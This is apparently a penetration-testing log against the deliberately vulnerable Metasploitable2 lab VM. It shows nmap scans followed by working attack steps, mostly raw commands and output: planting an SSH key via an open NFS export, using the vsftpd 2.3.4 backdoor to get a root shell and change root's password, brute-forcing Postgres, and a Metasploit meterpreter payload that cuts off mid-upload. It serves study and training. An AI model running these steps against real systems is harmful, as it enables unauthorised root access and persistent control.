* nmap 192.168.1.107 -Pn --open -sV --version-intensity 9

  Starting Nmap 6.40 ( http://nmap.org ) at 2014-10-22 21:06 CST
  Nmap scan report for localhost (192.168.1.107)
  Host is up (0.0011s latency).
  Not shown: 978 closed ports
  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 2.3.4
  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  23/tcp   open  telnet      Linux telnetd
  25/tcp   open  smtp        Postfix smtpd
  53/tcp   open  domain      ISC BIND 9.4.2
  80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
  111/tcp  open  rpcbind     2 (RPC #100000)
  139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
  512/tcp  open  exec?
  513/tcp  open  login
  514/tcp  open  shell?
  1099/tcp open  rmiregistry GNU Classpath grmiregistry
  1524/tcp open  shell       Metasploitable root shell
  2049/tcp open  nfs         2-4 (RPC #100003)
  2121/tcp open  ftp         ProFTPD 1.3.1
  3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
  5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
  5900/tcp open  vnc         VNC (protocol 3.3)
  6000/tcp open  X11         (access denied)
  6667/tcp open  irc         Unreal ircd
  8180/tcp open  unknown
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
  SF-Port514-TCP:V=6.40%I=9%D=10/22%Time=5447ABC7%P=i586-suse-linux-gnu%r(NU
  SF:LL,29,"\x01Host\x20address\x20mismatch\x20for\x20192\.168\.1\.103\n");
  Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 419.93 seconds
* nmap 192.168.1.107 -sV --version-intensity 9 -A

  Starting Nmap 6.40 ( http://nmap.org ) at 2014-10-23 09:03 CST
  Debugging Increased to 1. --在扫描开始的时候按下d
  Verbosity Increased to 1. --在扫描开始的时候按下v
  Completed Service scan at 09:09, 389.71s elapsed (22 services on 1 host)
  NSE: Script scanning 192.168.1.107.
  NSE: Starting runlevel 1 (of 2) scan.
  NSE: Starting address-info against 192.168.1.107.
  NSE: Starting ms-sql-info against 192.168.1.107.
  NSE: Starting nbstat against 192.168.1.107.
  NSE: Starting p2p-conficker against 192.168.1.107.
  NSE: Starting smb-os-discovery against 192.168.1.107.
  NSE: Starting smb-security-mode against 192.168.1.107.
  NSE: Starting smbv2-enabled against 192.168.1.107.
  NSE: Starting mysql-info against 192.168.1.107:3306.
  NSE: Starting rpc-grind against 192.168.1.107:512.
  NSE: Starting rpc-grind against 192.168.1.107:514.
  NSE: Starting rpc-grind against 192.168.1.107:2049.
  NSE: Starting rpcinfo against 192.168.1.107:2049.
  NSE: Starting ftp-anon against 192.168.1.107:21.
  NSE: Starting ftp-bounce against 192.168.1.107:21.
  NSE: Starting ssl-cert against 192.168.1.107:21.
  NSE: Starting ssl-date against 192.168.1.107:21.
  NSE: Starting http-auth against 192.168.1.107:80.
  NSE: Starting http-cors against 192.168.1.107:80.
  NSE: Starting http-favicon against 192.168.1.107:80.
  NSE: Starting http-generator against 192.168.1.107:80.
  NSE: Starting http-git against 192.168.1.107:80.
  NSE: Starting http-methods against 192.168.1.107:80.
  NSE: Starting http-robots.txt against 192.168.1.107:80.
  NSE: Starting http-title against 192.168.1.107:80.
  NSE: Starting ssh-hostkey against 192.168.1.107:22.
  NSE: Starting sshv1 against 192.168.1.107:22.
  NSE: Starting ftp-anon against 192.168.1.107:2121.
  NSE: Starting ftp-bounce against 192.168.1.107:2121.
  NSE: Starting x11-access against 192.168.1.107:6000.
  NSE: Starting irc-info against 192.168.1.107:6667.
  NSE: Starting rmi-dumpregistry against 192.168.1.107:1099.
  NSE: Starting realvnc-auth-bypass against 192.168.1.107:5900.
  NSE: Starting vnc-info against 192.168.1.107:5900.
  NSE: Starting smtp-commands against 192.168.1.107:25.
  NSE: Starting ssl-cert against 192.168.1.107:25.
  NSE: Starting ssl-date against 192.168.1.107:25.
  NSE: Starting http-auth against 192.168.1.107:8180.
  NSE: Starting http-cors against 192.168.1.107:8180.
  NSE: Starting http-favicon against 192.168.1.107:8180.
  NSE: Starting http-generator against 192.168.1.107:8180.
  NSE: Starting http-git against 192.168.1.107:8180.
  NSE: Starting http-methods against 192.168.1.107:8180.
  NSE: Starting http-robots.txt against 192.168.1.107:8180.
  NSE: Starting http-title against 192.168.1.107:8180.
  NSE: Starting rpc-grind against 192.168.1.107:8180.
  NSE: Starting skypev2-version against 192.168.1.107:8180.
  NSE: Starting dns-nsid against 192.168.1.107:53.
  NSE: Starting rpc-grind against 192.168.1.107:111.
  NSE: Starting rpcinfo against 192.168.1.107:111.
  Initiating NSE at 09:09
  NSE: Starting rpc-grind against 192.168.1.107:111.
  NSE: Starting rpc-grind against 192.168.1.107:111.
  NSE: Starting rpc-grind against 192.168.1.107:111.
  NSE: Starting rpc-grind against 192.168.1.107:111.
  NSE: Conficker: Generating ports based on ip (0x6b01a8c0) and seed (2337)
  NSE: Finished address-info against 192.168.1.107.
  NSE: Starting rpc-grind against 192.168.1.107:2049.
  NSE: Starting rpc-grind against 192.168.1.107:2049.
  NSE: Starting rpc-grind against 192.168.1.107:2049.
  NSE: Starting rpc-grind against 192.168.1.107:2049.
  NSE: Finished mysql-info against 192.168.1.107:3306.
  NSE: SMB: Added account '' to account list
  NSE: SMB: Added account 'guest' to account list
  NSE: Finished http-robots.txt against 192.168.1.107:80.
  NSE: dns.query() failed to resolve the requested query: id.server
  NSE: Finished x11-access against 192.168.1.107:6000.
  NSE: Finished rpcinfo against 192.168.1.107:111.
  NSE: 530 Please login with USER and PASS.

  NSE: AUTH TLS failed or unavailable.  Enable --script-trace to see what is happening.
  NSE: rpc-grind: isRPC didn't receive response.
  NSE: Target port 514 is not a RPC port.
  NSE: Finished rpc-grind against 192.168.1.107:514.
  NSE: Finished vnc-info against 192.168.1.107:5900.
  NSE: Finished realvnc-auth-bypass against 192.168.1.107:5900.
  NSE: Finished rpcinfo against 192.168.1.107:2049.
  NSE: Finished ssl-cert against 192.168.1.107:21.
  NSE: Finished smbv2-enabled against 192.168.1.107.
  NSE: RMI-ERR:Not enough data in buffer (1 required by readByte)
  NSE: Finished rmi-dumpregistry against 192.168.1.107:1099.
  NSE: No favicon found.
  NSE: Finished http-favicon against 192.168.1.107:80.
  NSE: Finished dns-nsid against 192.168.1.107:53.
  NSE: Finished rpc-grind against 192.168.1.107:111.
  NSE: Finished rpc-grind against 192.168.1.107:111.
  NSE: HERE: 1414026595
  NSE: Finished ssl-date against 192.168.1.107:25.
  NSE: Finished rpc-grind against 192.168.1.107:2049.
  NSE: Finished rpc-grind against 192.168.1.107:111.
  NSE: Finished rpc-grind against 192.168.1.107:111.
  NSE: Finished rpc-grind against 192.168.1.107:2049.
  NSE: Finished rpc-grind against 192.168.1.107:2049.
  NSE: Finished rpc-grind against 192.168.1.107:111.
  NSE: Finished rpc-grind against 192.168.1.107:2049.
  NSE: Finished nbstat against 192.168.1.107.
  NSE: SMB: Login as \guest failed (NT_STATUS_LOGON_FAILURE)
  NSE: Finished ftp-anon against 192.168.1.107:21.
  NSE: Finished http-auth against 192.168.1.107:80.
  NSE: Finished rpc-grind against 192.168.1.107:2049.
  NSE: Finished smb-security-mode against 192.168.1.107.
  NSE: Finished http-title against 192.168.1.107:80.
  NSE: SMB: WARNING: the server appears to be Unix; your mileage may vary.
  NSE: SMB: Login as WORKGROUP\<blank> failed, but was given guest access (username may be wrong, or system may only allow guest)
  NSE: 530 Please login with USER and PASS.

  NSE: AUTH TLS failed or unavailable.  Enable --script-trace to see what is happening.
  NSE: Finished http-generator against 192.168.1.107:80.
  NSE: Finished ssl-cert against 192.168.1.107:25.
  NSE: Finished ssl-date against 192.168.1.107:21.
  NSE: Finished sshv1 against 192.168.1.107:22.
  NSE: Finished http-git against 192.168.1.107:80.
  NSE: Finished ms-sql-info against 192.168.1.107.
  NSE: Finished smtp-commands against 192.168.1.107:25.
  NSE: Finished smb-os-discovery against 192.168.1.107.
  NSE: http-methods.nse: HTTP Status for OPTIONS is 200
  NSE: Finished http-methods against 192.168.1.107:80.
  NSE: Finished ftp-bounce against 192.168.1.107:21.
  NSE: Finished p2p-conficker against 192.168.1.107.
  NSE: Finished ssh-hostkey against 192.168.1.107:22.
  NSE: Finished http-cors against 192.168.1.107:80.
  NSE: Finished irc-info against 192.168.1.107:6667.
  NSE: Finished ftp-anon against 192.168.1.107:2121.
  NSE: Finished ftp-bounce against 192.168.1.107:2121.
  NSE: http-methods: OPTIONS / failed.
  NSE: Finished http-methods against 192.168.1.107:8180.
  NSE: Finished http-generator against 192.168.1.107:8180.
  NSE: Finished http-robots.txt against 192.168.1.107:8180.
  NSE: Finished http-git against 192.168.1.107:8180.
  NSE: rpc-grind: isRPC didn't receive response.
  NSE: Target port 512 is not a RPC port.
  NSE: Finished rpc-grind against 192.168.1.107:512.
  NSE: Finished skypev2-version against 192.168.1.107:8180.
  NSE: rpc-grind: isRPC didn't receive response.
  NSE: Target port 8180 is not a RPC port.
  NSE: Finished rpc-grind against 192.168.1.107:8180.
  NSE Timing: About 92.98% done; ETC: 09:10 (0:00:02 remaining)
  NSE: No favicon found.
  NSE: Finished http-favicon against 192.168.1.107:8180.
  NSE: Finished http-title against 192.168.1.107:8180.
  NSE Timing: About 96.49% done; ETC: 09:10 (0:00:02 remaining)
  NSE: Finished http-auth against 192.168.1.107:8180.
  NSE Timing: About 98.25% done; ETC: 09:11 (0:00:02 remaining)
  NSE Timing: About 98.25% done; ETC: 09:11 (0:00:02 remaining)
  NSE: Finished http-cors against 192.168.1.107:8180.
  Completed NSE at 09:12, 144.62s elapsed
  NSE: Starting runlevel 2 (of 2) scan.
  Nmap scan report for localhost (192.168.1.107)
  Host is up (0.00099s latency).
  Scanned at 2014-10-23 09:03:14 CST for 535s
  Not shown: 978 closed ports
  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 2.3.4
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  | ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
  |_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
  23/tcp   open  telnet      Linux telnetd
  25/tcp   open  smtp        Postfix smtpd
  |_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
  | ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
  | Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
  | Public Key type: rsa
  | Public Key bits: 1024
  | Not valid before: 2010-03-17T14:07:45+00:00
  | Not valid after:  2010-04-16T14:07:45+00:00
  | MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
  |_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
  |_ssl-date: 2014-10-23T01:09:55+00:00; +11s from local time.
  53/tcp   open  domain      ISC BIND 9.4.2
  | dns-nsid:
  |_  bind.version: 9.4.2
  80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
  |_http-title: Metasploitable2 - Linux
  111/tcp  open  rpcbind     2 (RPC #100000)
  | rpcinfo:
  |   program version   port/proto  service
  |   100000  2            111/tcp  rpcbind
  |   100000  2            111/udp  rpcbind
  |   100003  2,3,4       2049/tcp  nfs
  |   100003  2,3,4       2049/udp  nfs
  |   100005  1,2,3      40788/tcp  mountd
  |   100005  1,2,3      49752/udp  mountd
  |   100021  1,3,4      35619/udp  nlockmgr
  |   100021  1,3,4      52018/tcp  nlockmgr
  |   100024  1          33034/tcp  status
  |_  100024  1          33096/udp  status
  139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
  512/tcp  open  exec?
  513/tcp  open  login
  514/tcp  open  shell?
  1099/tcp open  rmiregistry GNU Classpath grmiregistry
  |_rmi-dumpregistry: Registry listing failed (No return data received from server)
  1524/tcp open  shell       Metasploitable root shell
  2049/tcp open  nfs         2-4 (RPC #100003)
  | rpcinfo:
  |   program version   port/proto  service
  |   100000  2            111/tcp  rpcbind
  |   100000  2            111/udp  rpcbind
  |   100003  2,3,4       2049/tcp  nfs
  |   100003  2,3,4       2049/udp  nfs
  |   100005  1,2,3      40788/tcp  mountd
  |   100005  1,2,3      49752/udp  mountd
  |   100021  1,3,4      35619/udp  nlockmgr
  |   100021  1,3,4      52018/tcp  nlockmgr
  |   100024  1          33034/tcp  status
  |_  100024  1          33096/udp  status
  2121/tcp open  ftp         ProFTPD 1.3.1
  3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
  | mysql-info: Protocol: 10
  | Version: 5.0.51a-3ubuntu5
  | Thread ID: 10
  | Some Capabilities: Connect with DB, Compress, SSL, Transactions, Secure Connection
  | Status: Autocommit
  |_Salt: n^j|OWE6{-kS?")FgREE
  5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
  5900/tcp open  vnc         VNC (protocol 3.3)
  | vnc-info:
  |   Protocol version: 3.3
  |   Security types:
  |_    Unknown security type (33554432)
  6000/tcp open  X11         (access denied)
  6667/tcp open  irc         Unreal ircd
  | irc-info:
  |   server: irc.Metasploitable.LAN
  |   version: Unreal3.2.8.1. irc.Metasploitable.LAN
  |   servers: 1
  |   users: 1
  |   lservers: 0
  |   lusers: 1
  |   uptime: 0 days, 0:08:48
  |   source host: 3AB98274.78DED367.FFFA6D49.IP
  |_  source ident: nmap
  8180/tcp open  unknown
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
  SF-Port514-TCP:V=6.40%I=9%D=10/23%Time=544853D2%P=i586-suse-linux-gnu%r(NU
  SF:LL,29,"\x01Host\x20address\x20mismatch\x20for\x20192\.168\.1\.103\n");
  Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | nbstat:
  |   NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
  |   Names
  |     METASPLOITABLE<00>   Flags: <unique><active>
  |     METASPLOITABLE<03>   Flags: <unique><active>
  |     METASPLOITABLE<20>   Flags: <unique><active>
  |     \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
  |     WORKGROUP<00>        Flags: <group><active>
  |     WORKGROUP<1d>        Flags: <unique><active>
  |_    WORKGROUP<1e>        Flags: <group><active>
  | smb-os-discovery:
  |   OS: Unix (Samba 3.0.20-Debian)
  |   NetBIOS computer name:
  |   Workgroup: WORKGROUP
  |_  System time: 2014-10-22T21:09:55-04:00
  | smb-security-mode:
  |_  ERROR: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [12]
  |_smbv2-enabled: ERROR: Couldn't negotiate protocol: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [12]
  Final times for host: srtt: 988 rttvar: 31  to: 100000

  NSE: Script Post-scanning.
  NSE: Starting runlevel 1 (of 2) scan.
  NSE: Starting ssh-hostkey.
  Initiating NSE at 09:12
  NSE: Finished ssh-hostkey.
  Completed NSE at 09:12, 0.00s elapsed
  NSE: Starting runlevel 2 (of 2) scan.
  Read from /usr/bin/../share/nmap: nmap-payloads nmap-service-probes nmap-services.
  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 534.93 seconds
* 2049/tcp open  nfs         2-4 (RPC #100003)
  | rpcinfo:                                |
  | program version   port/proto  service   |
  | 100000  2            111/tcp  rpcbind   |
  | 100000  2            111/udp  rpcbind   |
  | 100003  2,3,4       2049/tcp  nfs       |
  | 100003  2,3,4       2049/udp  nfs       |
  | 100005  1,2,3      40788/tcp  mountd    |
  | 100005  1,2,3      49752/udp  mountd    |
  | 100021  1,3,4      35619/udp  nlockmgr  |
  | 100021  1,3,4      52018/tcp  nlockmgr  |
  | 100024  1          33034/tcp  status    |
  | _  100024  1          33096/udp  status |
  +-----------------------------------------+

** # rpcinfo -p 192.168.1.107
  program vers proto   port  service
  100000    2   tcp    111  portmapper
  100000    2   udp    111  portmapper
  100024    1   udp  44972  status
  100024    1   tcp  56237  status
  100003    2   udp   2049  nfs
  100003    3   udp   2049  nfs
  100003    4   udp   2049  nfs
  100021    1   udp  55245  nlockmgr
  100021    3   udp  55245  nlockmgr
  100021    4   udp  55245  nlockmgr
  100003    2   tcp   2049  nfs
  100003    3   tcp   2049  nfs
  100003    4   tcp   2049  nfs
  100021    1   tcp  43672  nlockmgr
  100021    3   tcp  43672  nlockmgr
  100021    4   tcp  43672  nlockmgr
  100005    1   udp  54887  mountd
  100005    1   tcp  52139  mountd
  100005    2   udp  54887  mountd
  100005    2   tcp  52139  mountd
  100005    3   udp  54887  mountd
  100005    3   tcp  52139  mountd
** # showmount -e 192.168.1.107
  Export list for 192.168.1.107:
  / *
** # ssh-keygen
  Generating public/private rsa key pair.
  Enter file in which to save the key (/root/.ssh/id_rsa): id_msf
  Enter passphrase (empty for no passphrase):
  Enter same passphrase again:
  Your identification has been saved in id_msf.
  Your public key has been saved in id_msf.pub.
  The key fingerprint is:
  3a:ee:36:96:e2:55:1b:b5:8d:ef:c8:94:c8:36:b7:34 root@localhost
  The key's randomart image is:
  +--[ RSA 2048]----+
  |                 |
  |                 |
  |          .      |
  |         . +     |
  |        S o .    |
  |       + + o     |
  |      +.* E .    |
  |    .o=o * =     |
  |   ..=o.  + .    |
  +-----------------+
** # mkdir /tmp/r00t
** # mount -t nfs 192.168.1.107:/ /tmp/r00t/
  Starting rpc.statd ... portmapper not running                                    failed
  mount.nfs: rpc.statd is not running but is required for remote locking.
  mount.nfs: Either use '-o nolock' to keep locks local, or start statd.
  mount.nfs: an incorrect mount option was specified
** # mount -t nfs 192.168.1.107:/ /tmp/r00t/ -o nolock
** # cat ~/.ssh/id_msf.pub >> /tmp/r00t/root/.ssh/authorized_keys
** # ssh root@192.168.1.107
  The authenticity of host '192.168.1.107 (192.168.1.107)' can't be established.
  RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
  Are you sure you want to continue connecting (yes/no)? yes
  Warning: Permanently added '192.168.1.107' (RSA) to the list of known hosts.
  root@192.168.1.107's password:
* 21/tcp   open  ftp         vsftpd 2.3.4
  | _ftp-anon: Anonymous FTP login allowed (FTP code 230) |
  +-------------------------------------------------------+

** # telnet 192.168.1.107 21
  Trying 192.168.1.107...
  Connected to 192.168.1.107.
  Escape character is '^]'.
  220 (vsFTPd 2.3.4)
  503 Login with USER first.
  user backdoored:)
  331 Please specify the password.
  pass invalid
  ^]
  421 Timeout.
  Connection closed by foreign host.
  --(another shell)--
** # telnet 192.168.1.107 6200
  Trying 192.168.1.107...
  Connected to 192.168.1.107.
  Escape character is '^]'.
  id;
  uid=0(root) gid=0(root)
: command not found
*** ls;
  bin
  boot
  cdrom
  dev
  etc
  home
  initrd
  initrd.img
  lib
  lost+found
  media
  mnt
  nohup.out
  opt
  proc
  root
  sbin
  srv
  sys
  tmp
  usr
  var
  vmlinuz
*** passwd;
  Enter new UNIX password: root
  Retype new UNIX password: root
  passwd: password updated successfully
: command not found
  quit;
  sh: line 6: quit: command not found
: command not found
  exit;
  Connection closed by foreign host.
* 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
  +------------------------------------------------------+
** msf > use auxiliary/scanner/postgres/postgres_login
** msf auxiliary(postgres_login) > show options

   Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                                      Required  Description
   ----              ---------------                                                                      --------  -----------
   BLANK_PASSWORDS   false                                                                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                                    yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                            yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                                no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                                no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                                no        Add all users in the current database to the list
   PASSWORD                                                                                               no        A specific password to authenticate with
   PASS_FILE         /home/*/Develop/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                                no        Use a proxy chain
   RETURN_ROWSET     true                                                                                 no        Set to true to see query result sets
   RHOSTS                                                                                                 yes       The target address range or CIDR identifier
   RPORT             5432                                                                                 yes       The target port
   STOP_ON_SUCCESS   false                                                                                yes       Stop guessing when a credential works for a host
   THREADS           1                                                                                    yes       The number of concurrent threads
   USERNAME          postgres                                                                             no        A specific username to authenticate as
   USERPASS_FILE     /home/*/Develop/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                                no        Try the username as the password for all users
   USER_FILE         /home/*/Develop/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                                 yes       Whether to print output for all attempts
** msf auxiliary(postgres_login) > set RHOSTS 192.168.1.107
   RHOSTS => 192.168.1.107
** msf auxiliary(postgres_login) > run

   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
   [+] 192.168.1.107:5432 - LOGIN SUCCESSFUL: postgres:postgres@template1
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
   [-] 192.168.1.107:5432 POSTGRES - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
   [*] Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed

** ➜  ~  psql -h 192.168.1.107 -U postgres -W
   Password for user postgres:
   psql.bin (9.3.5, server 8.3.1)
   SSL connection (cipher: DHE-RSA-AES256-SHA, bits: 256)
   Type "help" for help.

*** postgres-# \l
    List of databases
    Name    |  Owner   | Encoding |   Access privileges
    -----------+----------+----------+-----------------------
    postgres  | postgres | UTF8     |
    template0 | postgres | UTF8     | =c/postgres          +
    |          |          | postgres=CTc/postgres
    template1 | postgres | UTF8     | =c/postgres          +
    |          |          | postgres=CTc/postgres
    (3 rows)
    +-                                                                            -+
** msf auxiliary(postgres_login) > use exploit/linux/postgres/postgres_payload
** msf exploit(postgres_payload) > set RHOST 192.168.1.107
   RHOST => 192.168.1.107
** msf exploit(postgres_payload) > show options

   Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
   RHOST     192.168.1.107    yes       The target address
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


   Exploit target:

   Id  Name
   --  ----
   0   Linux x86

** msf exploit(postgres_payload) > set verbose true
   verbose => true
** msf exploit(postgres_payload) > set password postgres
   password => postgres

** msf exploit(postgres_payload) > set payload linux/x86/meterpreter/bind_tcp
   payload => linux/x86/meterpreter/bind_tcp
** msf exploit(postgres_payload) > run

   [*] Started bind handler
   [*] Trying postgres:postgres@192.168.1.107:5432/template1
   [*] 192.168.1.107:5432 Postgres - querying with 'select version()'
   [*] 192.168.1.107:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
   [*] 192.168.1.107:5432 Postgres - querying with 'select lo_creat(-1)'
   [*] 192.168.1.107:5432 Postgres - querying with 'delete from pg_largeobject where loid=16388'
   [*] 192.168.1.107:5432 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(16388, 0, decode('f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAAAAAADgAAADgAwAAAAAAADQAIAAEACgADgANAAAAAAAGAAAAOAAAADgAAAA4AAAAgAAAAIAAAAAFAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADkAgAA5AIAAAUAAAAAEAAAAQAAAOgCAADoEgAA6BIAAPgAAAD4AAAABgAAAAAQAAACAAAAOAMAADgTAAA4EwAAgAAAAIAAAAAGAAAAAAAAAC90bXAvYnpMekFDUmcuc28AAGxpYmMuc28uNgBtbWFwAG1lbWNweQBtcHJvdGVjdABfZXhpdABmb3JrAHVubGluawAAAgAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIEwAABwEAAMwTAAAHAgAA0BMAAAcDAADUEwAABwQAANgTAAAHBQAA3BMAAAcGAAC4EwAACAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAASAAAAEAAAAAAAAAAAAAAAEgAAABcAAAAAAAAAAAAAABIAAAAgAAAAAAAAAAAAAAASAAAAJgAAAAAAAAAAAAAAEgAAACsAAAAAAAAAAAAAABIAAABVieWD7ARTVmoAagBqImoDaAAQAABqAOh6AAAAg8QYiUX8alDoXAAAAInGjYaTEAAAUP91/OhxAAAAg8QMagdoABAAAP91/Oh0AAAAg8QMhcB0CmoB6HsAAACDxAToiAAAAIXAdQP/VfzoFwAAAInGjYZj/v//UOiDAAAAg8QEXluJ7F3D6AAAAABYg8D7wwD/cwT/Ywjo6v///42YZxEAAP9jDGoA6eX////o1f///42YZxEAAP9jEGoI6dD////owP///42YZxEAAP9jFGoQ6bv////oq////42YZxEAAP9jGGoY6ab////olv///42YZxEAAP9jHGog6ZH////ogf///42YZxEAAP9jIGoo6Xz///8AAAAAan1YmbIHuQAQAACJ42aB4wDwzYAx2/fjU0NTagKJ4bBmzYBbXlJoAgARXGoQUVCJ4WpmWM2A0eOwZs2AQ7BmiVEEzYCTtgywA82Aid//4QABAAAAAQAAABkAAAC4EwAAGwAAAAQAAAAFAAAAyQAAAAoAAAAyAAAABAAAAPwAAAADAAAAvBMAABcAAAAoAQAAAgAAADAAAAAUAAAAEQAAABMAAAAIAAAAEQAAAFgBAAASAAAACAAAAAYAAABgAQAACwAAABAAAAAAAAAAAAAAANABAAA4EwAAAAAAAAAAAAB0AgAAiQIAAJ4CAACzAgAAyAIAAN0CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAAAEAAAACAAAAuAAAALgAAAARAAAAAAAAAAAAAAAIAAAACAAAABIAAAADAAAAAgAAAMkAAADJAAAAMgAAAAAAAAAAAAAAAQAAAAEAAAAaAAAABQAAAAIAAAD8AAAA/AAAACwAAAAGAAAAAAAAAAQAAAAEAAAAIAAAAAkAAAACAAAAKAEAACgBAAAwAAAABgAAAAAAAAAIAAAACAAAACkAAAAJAAAAAgAAAFgBAABYAQAACAAAAAYAAAAAAAAACAAAAAgAAAAyAAAACwAAAAIAAABgAQAAYAEAAHAAAAACAAAAAQAAAAQAAAAQAAAAOgAAAAEA